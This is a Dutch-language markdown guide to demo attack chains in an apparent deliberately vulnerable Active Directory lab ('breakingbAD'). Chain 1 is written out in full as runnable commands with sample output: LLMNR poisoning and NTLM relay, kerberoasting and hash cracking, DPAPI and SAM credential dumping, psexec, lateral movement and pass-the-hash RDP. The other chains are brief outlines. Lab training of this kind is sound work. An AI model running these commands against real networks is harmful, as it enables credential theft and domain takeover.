# breakingbAD Attack Chains

Demo-scenario's die meerdere kwetsbaarheden combineren tot een realistische aanvalsketen.

**Domain:** `breakingbad.local` | **DC:** `192.168.100.10` | **srv01:** `192.168.100.20` | **srv02:** `192.168.100.21`

---

## Chain 1: Poisoning → Relay → Kerberoast → DPAPI → Pivot (aanbevolen demo)

`06 (Responder poisoning) → relay naar LDAP (domain dump) → 07 (saul's wachtwoord in description) → 08 (kerberoast hector) → hector is local admin op srv01 → DPAPI credential dump → 12 (shared admin pivot naar srv02 & backups) → SAM dump → RDP`

> **Verhaal:** Een aanvaller op het netwerk vangt credentials op via LLMNR/NBT-NS poisoning. In plaats van de hash te kraken, wordt de authenticatie direct doorgestuurd (relay) naar de Domain Controller via LDAP. De Domain Controller geeft alle domein-informatie prijs, inclusief het wachtwoord van saul.goodman dat in zijn description-veld staat. Met saul's account wordt een Kerberos-ticket opgevraagd voor hector.salamanca (kerberoasting). Na het kraken van dit ticket blijkt hector local administrator te zijn op srv01, wat directe toegang geeft tot de server. Op srv01 worden via DPAPI opgeslagen credentials gedumpt: het wachtwoord van svc_admin uit een scheduled task genaamd "Backup to 192.168.100.149". Dit onthult zowel een credential als een nieuw doelwit. Omdat svc_admin een shared local admin is (vuln 12), werkt het account ook op srv02 en de backup-server. Op de backup-server wordt de lokale SAM database gedumpt, wat het administrator-wachtwoord oplevert. Hiermee kan de aanvaller via RDP inloggen op de non-domain-joined backup server.

```bash
# === Stap 1: Responder + ntlmrelayx (twee terminals) ===

# Zet Responder.conf: SMB = Off, HTTP = Off (ntlmrelayx pakt die poorten)
sudo sed -i 's/^SMB      = On/SMB      = Off/' /usr/share/responder/Responder.conf
sudo sed -i 's/^HTTP     = On/HTTP     = Off/' /usr/share/responder/Responder.conf

# Terminal 1: ntlmrelayx relayt naar LDAP en dumpt domeininfo
sudo ntlmrelayx.py -t ldap://192.168.100.10 -smb2support -l /tmp/relay-loot

# Terminal 2: Responder voor name poisoning
sudo responder -I eth0 -dwv

# Terminal 3: Trigger de poisoning (walter.white zoekt een onbekende share)
./lab.sh vuln trigger 6

# ntlmrelayx output: "Dumping domain info for first time" + "Domain info dumped into lootdir!"
# walter.white's NTLMv2 hash wordt ook gelogd (crack achteraf als bonus)

# === Stap 2: Saul's wachtwoord uit de LDAP dump ===

# Bekijk de domain dump — saul.goodman's wachtwoord staat in zijn description
grep saul /tmp/relay-loot/domain_users.grep
# Output: saul.goodman ... 657crsH!

# Of open de HTML voor een mooiere weergave
firefox /tmp/relay-loot/domain_users.html

# === Stap 3: Ontdek kerberoastable user & kerberoast ===

# In de LDAP dump staat hector's beschrijving — hint naar service account
grep hector /tmp/relay-loot/domain_users.grep
# Output: hector.salamanca ... Serviceaccount webapplicatie srv01

# Enumerate kerberoastable users met saul's credentials
GetUserSPNs.py breakingbad.local/saul.goodman:"657crsH!" -dc-ip 192.168.100.10
# Output: hector.salamanca  HTTP/srv01  → bevestigt SPN, kerberoastable!

# Request de TGS hash
GetUserSPNs.py breakingbad.local/saul.goodman:"657crsH!" -dc-ip 192.168.100.10 \
  -request -outputfile ~/breakingbAD/demo/hashes/kerberoast.txt

# Crack de TGS hash
hashcat -m 13100 ~/breakingbAD/demo/hashes/kerberoast.txt /usr/share/john/password.lst
# Of: ~/breakingbAD/demo/hashcrack.sh kerberoast
# Result: hector.salamanca = 346modL!

# === Stap 4: Hector is local admin op srv01 ===

nxc smb 192.168.100.20 -u hector.salamanca -p "346modL!" -x 'whoami'
# Output: (Admin!) breakingbad\hector.salamanca

# Dump SAM, get a shell, etc.
nxc smb 192.168.100.20 -u hector.salamanca -p "346modL!" --sam
psexec.py breakingbad.local/hector.salamanca:"346modL!"@192.168.100.20

# === Stap 5: DPAPI credential dump op srv01 ===

# Dump DPAPI-beschermde credentials met hector's local admin rechten
nxc smb 192.168.100.20 -u hector.salamanca -p "346modL!" --dpapi
# Output:
#   [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{...} - VAGRANT\svc_admin:Zomer123!
# De scheduled task heet "Backup to 192.168.100.149" → hint naar backup-server

# === Stap 6: Lateral movement via shared admin ===

# svc_admin:Zomer123! is een shared local admin (vuln 12) — werkt ook op srv02
nxc smb 192.168.100.21 -u svc_admin -p "Zomer123!" --local-auth -x "whoami"
# Output: (Admin!) srv02\svc_admin

# Pivot naar de non-domain-joined backup server (192.168.100.149)
nxc smb 192.168.100.149 -u svc_admin -p "Zomer123!" --local-auth -x "hostname"
# Output: (Admin!) backups\svc_admin

# === Stap 7: SAM dump op backups → Pass-the-Hash → RDP ===

# Dump de lokale SAM database op de backup server
nxc smb 192.168.100.149 -u svc_admin -p "Zomer123!" --local-auth --sam
# Output: Administrator:500:aad3b435...:92ccc277d463ed755e4ae47a9cef4943:::

# Pass-the-hash naar RDP als administrator
xfreerdp /v:192.168.100.149 /u:administrator /pth:92ccc277d463ed755e4ae47a9cef4943 /cert-ignore

# === Bonus: Crack walter.white's hash achteraf ===

# Hash staat in ntlmrelayx output, kopieer naar demo/hashes
# hashcat -m 5600 ~/breakingbAD/demo/hashes/ntlmv2.txt /usr/share/john/password.lst

# Zet Responder.conf terug naar defaults
sudo sed -i 's/^SMB      = Off/SMB      = On/' /usr/share/responder/Responder.conf
sudo sed -i 's/^HTTP     = Off/HTTP     = On/' /usr/share/responder/Responder.conf
```

---

## Chain 2: ADCS Escalation

`09 (ASREPRoast jessie) → auth as jessie → 10 (ESC1 cert as Admin) → Domain Admin`

---

## Chain 3: Relay Attack

`03 (WebClient coerce srv02) → 01 (relay to ADCS web enrollment) → cert as machine → DCSync`

---

## Chain 4: Recon to Lateral Movement

`11 (anon enum users) → 07 (find saul's password in description) → 08 (kerberoast hector) → 12 (shared admin → lateral)`
